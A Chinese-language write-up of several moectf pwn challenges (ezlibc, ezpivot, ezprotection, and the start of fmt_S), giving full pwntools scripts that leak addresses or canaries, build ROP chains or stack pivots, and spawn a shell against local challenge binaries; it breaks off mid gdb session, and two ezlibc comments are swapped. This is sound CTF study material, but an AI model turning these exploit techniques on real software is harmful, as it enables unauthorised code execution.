─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────
b+ 0x5555555551c6 <vuln+29>    call   read@plt                    <read@plt>
 
 ► 0x5555555551cb <vuln+34>    nop    
   0x5555555551cc <vuln+35>    leave  
   0x5555555551cd <vuln+36>    ret    
 
   0x5555555551ce <main>       endbr64 
   0x5555555551d2 <main+4>     push   rbp
   0x5555555551d3 <main+5>     mov    rbp, rsp
b+ 0x5555555551d6 <main+8>     sub    rsp, 0x10
   0x5555555551da <main+12>    mov    rax, qword ptr [rip + 0x2e67]     RAX, [stdout@GLIBC_2.2.5]
   0x5555555551e1 <main+19>    mov    esi, 0                            ESI => 0
   0x5555555551e6 <main+24>    mov    rdi, rax
──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7fffffffdc90 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789\n'
... ↓            3 skipped
04:0020│ rbp     0x7fffffffdcb0 ◂— 'aaaaaaaa123456789\n'
05:0028│+008     0x7fffffffdcb8 ◂— '123456789\n'
06:0030│+010     0x7fffffffdcc0 ◂— 0xa39 /* '9\n' */
07:0038│+018     0x7fffffffdcc8 —▸ 0x555555558030 (read@got[plt]) —▸ 0x7ffff7eace90 (read) ◂— sub rsp, 0x10
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► 0   0x5555555551cb vuln+34
   1 0x3837363534333231 None
   2            0xa39 None
   3   0x555555558030 read@got[plt]
   4              0x1 None
   5   0x7ffff7dd2ca8 __libc_start_call_main+120
   6   0x7ffff7dd2d65 __libc_start_main+133
   7   0x5555555550e5 _start+37
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack
00:0000│ rsi rsp 0x7fffffffdc90 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa123456789\n'
... ↓            3 skipped
04:0020│ rbp     0x7fffffffdcb0 ◂— 'aaaaaaaa123456789\n'
05:0028│+008     0x7fffffffdcb8 ◂— '123456789\n'
06:0030│+010     0x7fffffffdcc0 ◂— 0xa39 /* '9\n' */
07:0038│+018     0x7fffffffdcc8 —▸ 0x555555558030 (read@got[plt]) —▸ 0x7ffff7eace90 (read) ◂— sub rsp, 0x10
```

**解读：**

- 我们用`gdb`启动`pwndbg`然后在`main`下断点`r`运行起来
- 然后给`vuln`函数的这句`.text:00000000000011C6                 call    _read`下断点`*$rebase(0x11C6)`
- 测试栈溢出

然后搜集一下数据

**数据搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ objdump -d pwn | grep "read@plt"
0000000000001060 <read@plt>:
    11c6:       e8 e5 fe ff ff          call   1060 <read@plt>
                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ objdump -d pwn | grep "_start"  
    1008:       48 8b 05 d9 2f 00 00    mov    0x2fd9(%rip),%rax        # 3fe8 <__gmon_start__@Base>
00000000000010c0 <_start>:
    10df:       ff 15 f3 2e 00 00       call   *0x2ef3(%rip)        # 3fd8 <__libc_start_main@GLIBC_2.34>
                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ ropper -f libc.so.6 --search "pop rdi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: libc.so.6
0x000000000002a3e5: pop rdi; ret; 

                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ ropper -f libc.so.6 --search "ret 0;"       
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret 0;

[INFO] File: libc.so.6
0x000000000002db7d: ret 0; 

                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ strings -a -t x libc.so.6 | grep "bin/sh"
 1d8678 /bin/sh
```

搜集数据完成后

我们就可以来规划一下我们的解题思路了

**解题思路**

- 为了解决`ASLR`的问题，我们可以重新跳回`_start`函数

- 同时在`PIE`下我们用`elf_base = read_plt_addr - read_plt_offset`得到`elf_base`然后加上`start_offset`得到`start_addr`这样就可以利用栈溢出再次会跳到`start`
- 再次回到`vuln`我们就解决了`ASLR`的问题了
- 这时候我们leak泄露出的read就是`read_got_addr`了，我们用它减去`read_offset`就能得到`libc_base_addr`
- 我们再构造ROP链`pop_rdi_ret + bin_sh + system`就行了，为了对齐我们的ROP链改成`pop_rdi_ret + bin_sh + ret + system`

先试试回跳到start函数

**编写尝试脚本**

```python
from pwn import *

r = remote("127.0.0.1", 36745)
libc = ELF("libc.so.6")

r.recvuntil(b"How can I use ")
read_plt_offset = 0x1060 # objdump -d pwn | grep "read@plt"
read_plt_addr = int(r.recvline().strip().replace(b" without a backdoor? Damn!", b''), 16)
elf_base_addr = read_plt_addr - read_plt_offset
start_offset = 0x10C0 # objdump -d pwn | grep "_start"
start_addr = elf_base_addr + start_offset

payload = cyclic(0x20) + p64(0xdeadbeef) + p64(start_addr)
r.sendline(payload)

r.interactive()
```

**运行测试脚本**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ python3 payload.py
[+] Opening connection to 127.0.0.1 on port 36745: Done
[*] '/home/kali/Desktop/ctf/ezlibc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
What is this?
How can I use 0x7ff7c3c247d0 without a backdoor? Damn!
```

达成预期

我们继续编写恶意脚本

**继续编写恶意脚本**

```python
from pwn import *

r = remote("127.0.0.1", 36745)
libc = ELF("libc.so.6")

r.recvuntil(b"How can I use ")
read_plt_offset = 0x1060 # objdump -d pwn | grep "read@plt"
read_plt_addr = int(r.recvline().strip().replace(b" without a backdoor? Damn!", b''), 16)
elf_base_addr = read_plt_addr - read_plt_offset
start_offset = 0x10C0 # objdump -d pwn | grep "_start"
start_addr = elf_base_addr + start_offset

payload = cyclic(0x20) + p64(0xdeadbeef) + p64(start_addr)
r.sendline(payload)

r.recvuntil(b"How can I use ")
read_got_addr = int(r.recvline().strip().replace(b" without a backdoor? Damn!", b''), 16)
libc_base_addr = read_got_addr - libc.sym["read"]

pop_rdi_ret_offset = 0x2a3e5 # ropper -f libc.so.6 --search "pop rdi; ret;"
pop_rdi_ret_addr = libc_base_addr + pop_rdi_ret_offset
bin_sh_offset = 0x1d8678 # ropper -f libc.so.6 --search "ret 0;"
bin_sh_addr = libc_base_addr + bin_sh_offset
ret_offset = 0x2db7d # strings -a -t x libc.so.6 | grep "bin/sh"
ret_addr = libc_base_addr + ret_offset
system_offset = libc.sym["system"]
system_addr = libc_base_addr + system_offset

payload = cyclic(0x20) + p64(0xdeadbeef) + p64(pop_rdi_ret_addr) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)
r.sendline(payload)

r.interactive()
```

**运行恶意脚本**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/ezlibc]
└─$ python3 payload.py
[+] Opening connection to 127.0.0.1 on port 36745: Done
[*] '/home/kali/Desktop/ctf/ezlibc/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
$ ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
moectf{hoW-cAN-yoU-get_Th15_1I6C_@dDR32b487a}
```

**得到：moectf{hoW-cAN-yoU-get_Th15_1I6C_@dDR32b487a}**



### **ezpivot**

#### 解题过程

**信息搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ file pwn
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1ac7fb41d46f0cc3beb0d8aa946bdf66148bd5b2, for GNU/Linux 3.2.0, not stripped
                                                                                                     
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+0h] [rbp-10h] BYREF
  _BYTE buf[12]; // [rsp+4h] [rbp-Ch] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Welcome to join this pwn party!");
  puts("Please say something to introduce yourself:");
  puts("Before that,you need to tell us the length of your introduction.");
  __isoc99_scanf("%d", &v4);
  if ( v4 > 32 )
  {
    puts("Your introduction is too long, please try again.");
    exit(1);
  }
  introduce((unsigned int)v4);
  puts("Now, please tell us your phone number:");
  read(0, buf, len_of_phonenum);
  return 0;
}

int __fastcall introduce(unsigned int a1)
{
  read(0, &desc, a1);
  return puts("Ok,we got your introduction!");
}
```

**分析：**

- 这里有一个很有意思的漏洞`if ( v4 > 32 )`但是`introduce((unsigned int)v4);`这里用了`unsigned int`，这说明我们可以用负数来突破长度限制比如`-1 ---unsigned int---> 0xFFFFFFFF`
- 突破了长度限制以后我们就能用`read(0, buf, len_of_phonenum);`无限写入数据引导
- 然后我们只需要引导`return puts("Ok,we got your introduction!");`跳转我们的写入的ROP链就可以了

因为我们要写入数据所以这就涉及了`rsp`栈指针抬升的问题，然后牵扯到初始化会覆盖我们写入内容的问题，还有要找一下后门函数

**数据搜集**

这里找到后门函数

```c
int backdoor()
{
  return system("echo moectf{WowYouGetTheFlag}");
}
```

但是它只有`echo`

我们看一下后门函数的汇编代码

```nasm
.text:000000000040121E                 public backdoor
.text:000000000040121E backdoor        proc near
.text:000000000040121E ; __unwind {
.text:000000000040121E                 endbr64
.text:0000000000401222                 push    rbp
.text:0000000000401223                 mov     rbp, rsp
.text:0000000000401226                 lea     rax, command    ; "echo moectf{WowYouGetTheFlag}"
.text:000000000040122D                 mov     rdi, rax        ; command
.text:0000000000401230                 call    _system
.text:0000000000401235                 pop     rbp
.text:0000000000401236                 retn
.text:0000000000401236 ; } // starts at 40121E
.text:0000000000401236 backdoor        endp
```

接着我们查一下初始化的问题

```
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ nm pwn | grep "system"
                 U system@GLIBC_2.2.5
```

`U`代表未定义，通常因为是动态链接中

`T`代表已初始化，通常出现在静态链接中

然后搜集一下其他我们可能会用到的数据

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn --search "pop rdi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: pwn
0x0000000000401219: pop rdi; ret; 

                                                                                                     
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn --search "ret"          
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: pwn
0x00000000004011ea: ret 0x8d48; 
0x000000000040101a: ret; 

┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn --search "leave; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave; ret;

[INFO] File: pwn
0x000000000040120f: leave; ret; 

                                                                                                     
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ objdump -d pwn | grep "system"
00000000004010a0 <system@plt>:
  4010a4:       f2 ff 25 1d 2f 00 00    bnd jmp *0x2f1d(%rip)        # 403fc8 <system@GLIBC_2.2.5>
  401230:       e8 6b fe ff ff          call   4010a0 <system@plt>
```

`.bss`数据段

```nasm
.bss:0000000000404020 ; # 开始
...
...
.bss:0000000000404060                 public desc
...
...
.bss:000000000040485F _bss            ends # 结束
.bss:000000000040485F
.prgend:0000000000404860 ; ===========================================================================
```

**分析：**

- 为了避免`rsp`栈指针在初始化时快速抬升覆盖我们写入的数据，我们可以直接把数据打在`0000000000404860`高位地址

**编写恶意脚本**

```python
from pwn import *

r = remote('127.0.0.1',7631)

pop_rdi_ret = 0x401219
ret_addr = 0x40101a

bss_start_addr = 0x404060
bss_end_addr = 0x404860
rbp_addr = bss_end_addr - 0x8
leave_ret = 0x40120f

r.sendlineafter(b"Before that,you need to tell us the length of your introduction.", b'-1')

payload = cyclic(bss_end_addr - bss_start_addr)
payload += p64(pop_rdi_ret) + p64(bss_end_addr+24) + p64(0x4010a0)
payload += b'/bin/sh\x00'
r.sendline(payload)

payload = cyclic(0xC)
payload += p64(rbp_addr)
payload += p64(leave_ret)
r.sendafter(b"Now, please tell us your phone number:", payload)

r.interactive()
```

**解读：**

- 这里我们把八字节的`/bin/sh\x00`写在`bss_end_addr + 8 + 8 + 8`这里
- 从旧的`rbp`基址寄存器开始覆盖

**运行恶意脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 7631
[x] Opening connection to 127.0.0.1 on port 7631: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 7631: Done
[*] Switching to interactive mode

ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{YOu_Can_n0t-overFlOw-eNOUGh_BYTES7b4a88}
```

**得到：moectf{YOu_Can_n0t-overFlOw-eNOUGh_BYTES7b4a88}**



### ezpivot (二刷)

#### 解题过程

```python
from pwn import *

r = remote("127.0.0.1", 44995)

r.sendlineafter(b".\n", b'-1')

pop_rdi_ret = 0x401219
ret_addr = 0x40101a

desc_start_addr = 0x404060
desc_end_addr = 0x404860
bss_start_addr = 0x404020
bss_end_addr = 0x404860
bss_rbp_addr = bss_end_addr - 0x8
leave_ret_addr = 0x40120f

bin_sh_addr = bss_end_addr + 8*3
system_addr = 0x4010a0

payload = cyclic(desc_end_addr - desc_start_addr)
payload += p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
payload += b"/bin/sh\x00"
r.send(payload)

payload = cyclic(0xC)
payload += p64(bss_rbp_addr) + p64(leave_ret_addr)
r.sendafter(b":\n", payload)

r.interactive()
```

**分析：**

- `r.sendlineafter(b".\n", b'-1')`特别强调这句
- 如果不需要溢出一般选择`sendline`
- 如果发送溢出考虑到`\n`污染，一定要求用`send`

```shell
/home/kali/Desktop/ctf/python/.venv/bin/python /home/kali/Desktop/ctf/python/com/probie/Main.py 
[x] Opening connection to 127.0.0.1 on port 44995
[x] Opening connection to 127.0.0.1 on port 44995: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 44995: Done
[*] Switching to interactive mode
ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
cat flag
moectf{YOu_Can_n0t-overFlOw-eNOUGh_BYTES7b4a88}
```

**得到：moectf{YOu_Can_n0t-overFlOw-eNOUGh_BYTES7b4a88}**



### **ezprotection**

#### 解题过程

**信息搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ file pwn  
pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=437c78c7860c8b14ceccd533e9ff61bcbc5a84ed, for GNU/Linux 3.2.0, not stripped
                                                                                                                              
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析：**

- linux64位小端序可执行文件
- Canary
- PIE
- NX

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  vuln();
  return 0;
}

unsigned __int64 vuln()
{
  char buf[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(aThisTimeIWon);
  puts("Here is a beautiful canary, and it will be watching over you.");
  read(0, buf, 0x2AuLL);
  puts("Go ahead and overflow, anyway I have a canary.");
  puts(buf);
  puts("I will give you a second chance, since you can not do anything anyway.");
  puts(aEvenIfYouKillT);
  read(0, buf, 0x2AuLL);
  return v2 - __readfsqword(0x28u);
}
```

**分析：**

- 这里有两个很大的栈溢出`read(0, buf, 0x2AuLL);`和`read(0, buf, 0x2AuLL);`
- 并且这里会`puts(buf);`我们可利用第一个栈溢出覆盖`buf`字符串末尾的`\x00`让它泄露`canary`
- 然后利用第二个栈溢出执行ROP来调用`system("bin/sh")`或`system.call("bin/sh", 0, 0, 59)`或跳转到`后门函数`地址
- 这里由于开启了PIE无法直接跳转但后门函数，但是PIE的分页机制存在漏洞，即`地址后三位固定`，我们只需要爆破`低位地址的最高位数字`就可以了

然后我们找一下有没有后门函数

**数据搜集**

```c
void __noreturn backdoor()
{
  _QWORD buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = __readfsqword(0x28u);
  puts("Give me the password!");
  read(0, buf, 8uLL);
  if ( buf[0] == password )
  {
    puts("You find the secret:");
    fd = open("/flag", 0);
    if ( fd == -1 )
    {
      puts("Failed to open flag file.");
      exit(1);
    }
    read(fd, &flag, 0x64uLL);
    write(1, &flag, 0x64uLL);
    close(fd);
  }
  exit(0);
}
```

有一个后门函数我们看一下它的汇编代码

```nasm
.text:0000000000001229                 public backdoor
.text:0000000000001229 backdoor        proc near
.text:0000000000001229
.text:0000000000001229 buf             = qword ptr -10h
.text:0000000000001229 var_8           = qword ptr -8
.text:0000000000001229
.text:0000000000001229 ; __unwind {
.text:0000000000001229                 endbr64
.text:000000000000122D                 push    rbp
.text:000000000000122E                 mov     rbp, rsp
.text:0000000000001231                 sub     rsp, 10h
.text:0000000000001235                 mov     rax, fs:28h
.text:000000000000123E                 mov     [rbp+var_8], rax
.text:0000000000001242                 xor     eax, eax
.text:0000000000001244                 lea     rax, s          ; "Give me the password!"
.text:000000000000124B                 mov     rdi, rax        ; s
.text:000000000000124E                 call    _puts
.text:0000000000001253                 lea     rax, [rbp+buf]
.text:0000000000001257                 mov     edx, 8          ; nbytes
.text:000000000000125C                 mov     rsi, rax        ; buf
.text:000000000000125F                 mov     edi, 0          ; fd
.text:0000000000001264                 call    _read
.text:0000000000001269                 mov     rdx, [rbp+buf]
.text:000000000000126D                 mov     rax, cs:password
.text:0000000000001274                 cmp     rdx, rax
.text:0000000000001277                 jnz     loc_1311
.text:000000000000127D                 lea     rax, aYouFindTheSecr ; "You find the secret:"
.text:0000000000001284                 mov     rdi, rax        ; s
.text:0000000000001287                 call    _puts
.text:000000000000128C                 mov     esi, 0          ; oflag
.text:0000000000001291                 lea     rax, file       ; "/flag"
.text:0000000000001298                 mov     rdi, rax        ; file
.text:000000000000129B                 mov     eax, 0
.text:00000000000012A0                 call    _open
.text:00000000000012A5                 mov     cs:fd, eax
.text:00000000000012AB                 mov     eax, cs:fd
.text:00000000000012B1                 cmp     eax, 0FFFFFFFFh
.text:00000000000012B4                 jnz     short loc_12CF
.text:00000000000012B6                 lea     rax, aFailedToOpenFl ; "Failed to open flag file."
.text:00000000000012BD                 mov     rdi, rax        ; s
.text:00000000000012C0                 call    _puts
.text:00000000000012C5                 mov     edi, 1          ; status
.text:00000000000012CA                 call    _exit
.text:00000000000012CF ; ---------------------------------------------------------------------------
.text:00000000000012CF
.text:00000000000012CF loc_12CF:                               ; CODE XREF: backdoor+8B↑j
.text:00000000000012CF                 mov     eax, cs:fd
.text:00000000000012D5                 mov     edx, 64h ; 'd'  ; nbytes
.text:00000000000012DA                 lea     rcx, flag
.text:00000000000012E1                 mov     rsi, rcx        ; buf
.text:00000000000012E4                 mov     edi, eax        ; fd
.text:00000000000012E6                 call    _read
.text:00000000000012EB                 mov     edx, 64h ; 'd'  ; n
.text:00000000000012F0                 lea     rax, flag
.text:00000000000012F7                 mov     rsi, rax        ; buf
.text:00000000000012FA                 mov     edi, 1          ; fd
.text:00000000000012FF                 call    _write
.text:0000000000001304                 mov     eax, cs:fd
.text:000000000000130A                 mov     edi, eax        ; fd
.text:000000000000130C                 call    _close
.text:0000000000001311
.text:0000000000001311 loc_1311:                               ; CODE XREF: backdoor+4E↑j
.text:0000000000001311                 mov     edi, 0          ; status
.text:0000000000001316                 call    _exit
.text:0000000000001316 ; } // starts at 1229
.text:0000000000001316 backdoor        endp
```

前面的密码不用管

我们直接可跳`puts("You find the secret:");`即`0x127D`我们取`0x?27D`其中`? ∈ [0,F]`我们取`1`得`0x127D`

我们先尝试泄露`canary`

**编写尝试脚本**

```python
from pwn import *

r = remote('127.0.0.1', 2048)

r.sendafter(b"Here is a beautiful canary, and it will be watching over you.", cyclic(0x18) + b'\xff')

r.recvuntil(b'\xff')
canary = u64(b'\x00' + r.recv(0x7))

print(canary)
```

首先了解到`canary`的结构是`\x00 + 7字节`，我们先覆盖`\x00`泄露`canary`的后七位字节，然后补回`\x00`

**运行尝试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test02\Main.py 
[x] Opening connection to 127.0.0.1 on port 2048
[x] Opening connection to 127.0.0.1 on port 2048: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2048: Done
16831019552781722624
[*] Closed connection to 127.0.0.1 port 2048

进程已结束，退出代码为 0
```

得到`canary`的地址`16831019552781722624`因为开了`PIE`所以这个地址是会变的

所以我们要现泄现用

**继续编写恶意脚本**

```python
from pwn import *

for i in range(0xFF):
    r = remote('127.0.0.1', 2048)

    r.sendafter(b"Here is a beautiful canary, and it will be watching over you.", cyclic(0x18) + b'\xff')

    r.recvuntil(b'\xff')
    canary = u64(b'\x00' + r.recv(0x7))

    r.recvuntil(b"be able to overflow enough bytes.")
    r.send(cyclic(0x18) + p64(canary) + p64(0xdeadbeef) + p16(0x127D))

    r.recvline() # \n
    try:
        r.recvline() # You find the secret:
        r.interactive()
    except EOFError:
        r.close()
```

我们爆破低地址，用`r.recvline()`的`EOFError`判断成败

**运行恶意脚本**

```shell
[x] Opening connection to 127.0.0.1 on port 2048
[x] Opening connection to 127.0.0.1 on port 2048: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2048: Done
[*] Closed connection to 127.0.0.1 port 2048
[x] Opening connection to 127.0.0.1 on port 2048
[x] Opening connection to 127.0.0.1 on port 2048: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2048: Done
[*] Closed connection to 127.0.0.1 port 2048
[x] Opening connection to 127.0.0.1 on port 2048
[x] Opening connection to 127.0.0.1 on port 2048: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2048: Done
[*] Closed connection to 127.0.0.1 port 2048
[x] Opening connection to 127.0.0.1 on port 2048
[x] Opening connection to 127.0.0.1 on port 2048: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 2048: Done
[*] Switching to interactive mode
moectf{jU5t_5OME_3aSy_Pr0TEcTl0n267723bf}
                                                          [*] Got EOF while reading in interactive
```

**得到：moectf{jU5t_5OME_3aSy_Pr0TEcTl0n267723bf}**



### **fmt_S**

#### 解题过程

**信息搜集**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/fmt_s]
└─$ file pwn  
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=62cc6407e555e3b88acc68305f3156b5418472ac, for GNU/Linux 3.2.0, not stripped
                                                                           
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/fmt_s]
└─$ checksec pwn
[*] '/home/kali/Desktop/ctf/fmt_s/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析：**

- linux64位小端序可执行文件
- Canary
- NX

**下载解压扔进IDA查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("You're walking down the road when a monster appear.");
  for ( i = 1; i <= 3 && !flag; ++i )
    talk();
  if ( (unsigned __int64)atk <= 0x1BF52 )
    puts("You've been eaten by the monster.");
  else
    he();
  return 0;
}

__int64 talk()
{
  puts("You start talking to him...");
  flag ^= 1u;
  read(0, fmt, 0x20uLL);
  printf(fmt);
  puts("?");
  puts("You enraged the monster-prepare for battle!");
  return my_read(&atk, 8LL);
}

size_t __fastcall my_read(_BYTE *a1, size_t a2)
{
  a1[read(0, a1, a2)] = 0;
  return strlen(a1);
}

unsigned __int64 he()
{
  char command[6]; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  qmemcpy(command, "a_flag", sizeof(command));
  puts("The monster is defeated, and you obtain: flag?");
  system(command);
  return v2 - __readfsqword(0x28u);
}
```

先粗略查看一下，不着急分析，找一下出现的数据先

**数据搜集**

```nasm
.bss:00000000004040A0                 public atk
.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o
.bss:00000000004040A0                                         ; main:loc_4013BE↑r
.bss:00000000004040A8                 public flag
.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r
.bss:00000000004040A8                                         ; talk+24↑w ...
.bss:00000000004040AC                 align 20h
.bss:00000000004040C0                 public fmt
.bss:00000000004040C0 ; char fmt[256]
.bss:00000000004040C0 fmt             db 100h dup(?)

.text:0000000000401258                 mov     dword ptr [rbp+command], 6C665F61h
.text:000000000040125F                 mov     [rbp+var_A], 6761h
.text:0000000000401265                 lea     rax, s          ; "The monster is defeated, and you obtain"...
.text:000000000040126C                 mov     rdi, rax        ; s
.text:000000000040126F                 call    _puts
.text:0000000000401274                 lea     rax, [rbp+command]
.text:0000000000401278                 mov     rdi, rax        ; command
.text:000000000040127B                 call    _system
.text:0000000000401280                 nop
.text:0000000000401281                 mov     rax, [rbp+var_8]
.text:0000000000401285                 sub     rax, fs:28h
.text:000000000040128E                 jz      short locret_401295
.text:0000000000401290                 call    ___stack_chk_fail
.text:0000000000401295 ; ---------------------------------------------------------------------------
.text:0000000000401295
.text:0000000000401295 locret_401295:                          ; CODE XREF: he+51↑j
.text:0000000000401295                 leave
.text:0000000000401296                 retn
.text:0000000000401296 ; } // starts at 40123D
.text:0000000000401296 he              endp
```

**分析：**

- 从这里可以看出`for ( i = 1; i <= 3 && !flag; ++i )`它可以循环三次，但是它受到`flag`的制约，但我们发现`atk`距离`flag`只有`8`距离，意味着我们可以用`return my_read(&atk, 8LL);` -> `a1[read(0, a1, a2)] = 0;`来让`atk`溢出一个`\x00`从而覆盖掉`flag`的值，让它满足循环条件
- 接着我们找到`he`函数的这个`.text:000000000040127B                 call    _system`我们是可以利用的
- 然后我们发现`read(0, fmt, 0x20uLL);` -> `printf(fmt);`这里存在**格式化字符串**漏洞可以加以利用

**解题思路：**

- 泄露`command`的栈地址
- 通过`command`的栈地址计算出站地址`栈地址 = 返回地址 - 泄露地址`，然后写入栈地址
- 然后往栈地址里写入值

我们可以先用格式化字符串`%x$p`来泄露`command`的地址，从`7`开始数`7 -> int i`然后`8 -> char command[6];`

**编写尝试脚本**

```python
from pwn import *

r = remote("127.0.0.1", 3834)

system_addr = 0x40127b

r.sendafter(b"You start talking to him...", b"%8$p")
r.recvuntil(b"0x")
command_addr = int(b"0x"+r.recv(12), 16)

print(command_addr)
```

**运行测试脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 3834
[x] Opening connection to 127.0.0.1 on port 3834: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 3834: Done
140729338601504
[*] Closed connection to 127.0.0.1 port 3834

进程已结束，退出代码为 0
```

没问题，然后我们要通过`command`的栈地址，计算出栈地址

我们用gdb，我这里用pwndbg进行调试搜集一下数据

**搜集数据**

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/fmt_s]
└─$ objdump -d pwn | grep "printf"
00000000004010f0 <printf@plt>:
  4010f4:       ff 25 2e 2f 00 00       jmp    *0x2f2e(%rip)        # 404028 <printf@GLIBC_2.2.5>
  401332:       e8 b9 fd ff ff          call   4010f0 <printf@plt>
```

我们要在`printf`这里下断点，先拿到它的地址，我们这里取`0x401332`这条

```shell
┌──(venv)─(kali㉿kali)-[~/Desktop/ctf/fmt_s]
└─$ gdb pwn
GNU gdb (Debian 16.3-5) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
